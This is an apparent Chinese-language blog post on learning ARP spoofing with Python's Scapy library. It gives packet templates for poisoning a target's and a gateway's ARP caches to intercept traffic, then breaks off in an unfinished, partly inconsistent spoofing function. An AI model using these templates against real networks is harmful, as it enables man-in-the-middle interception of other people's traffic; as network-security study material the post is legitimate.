---
layout: post
title: Scapy模块学习之ARP欺骗
tag: Python
date: 2018-05-08
---



```
from scapy.all import Ether,ARP,sendp,getmacbyip
```

> Ether：用来构建以太网数据包
> ARP：构建ARP数据包的类
> sendp：在第二层发送数据包
> getmacbyip：返回对应IP的MAC地址

###核心部分：
#####伪造网关 欺骗目标计算机：
Ether(src=[本机MAC],dst=[目标MAC])/ARP(hwsrc=[本机MAC],psrc=[网管IP],hwdst=[目标MAC],pdst=[目标IP],op=2)
>ARP将网关IP地址映射到本机MAC上，针对dst即目标（dst值为空时，针对当前网段所有IP）；Ether以网关身份向目标发包

#####伪造目标计算机 欺骗网关：
Ether(src=[本机MAC],dst=[网关MAC])/ARP(hwsrc=[本机MAC],psrc=[目标IP],hwdst=[网关MAC],pdst=[网关IP],op=2)
>ARP将目标IP地址映射到本机MAC上，针对网关；Ether以目标身份向网关发包（猜测psrc不填时，将伪造当前网段内所有IP的发包）
>op表示ARP响应


```python
from scapy.all import Ether,ARP,sendp,getmacbyip,get_if_hwaddr
bjMAC=get_if_hwaddr(wk)
mbMAC=getmacbyip(mbIP)
wgMAC=getmacbyip(wgIP)
ether=Ether()
arp=ARP()
def arpSpoof(mbMAC,wgMAC,bjMAC):
	try:
		eth.src=bjMAC
		eth.dst=wgMAC
		
		
```


未完待续...
